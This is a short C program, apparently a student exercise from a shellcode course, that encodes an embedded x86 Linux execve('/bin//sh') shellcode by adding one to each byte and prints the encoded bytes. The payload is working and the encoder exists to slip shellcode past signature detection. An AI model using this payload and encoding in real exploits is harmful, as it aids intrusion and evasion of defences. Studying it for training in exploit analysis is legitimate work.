/* Filename    : encoder.c
 * Author      : Joris Hartog
 * Date        : 23-11-2015
 * Student     : SLAE-704
 * Description : This program encodes a shellcode by
 *  incrementing each byte by one.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char shellcode[] = \
"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void main() {
	//Print encoded shellcode
	int i;
	for(i = 0; i < strlen(shellcode); i++) {
		shellcode[i]++;
		printf("0x%02x", (0xFF & shellcode[i]));
		if (i+1 < strlen(shellcode)) {
			printf(",");
		}
	}	
	printf("\nDone!\n");
}


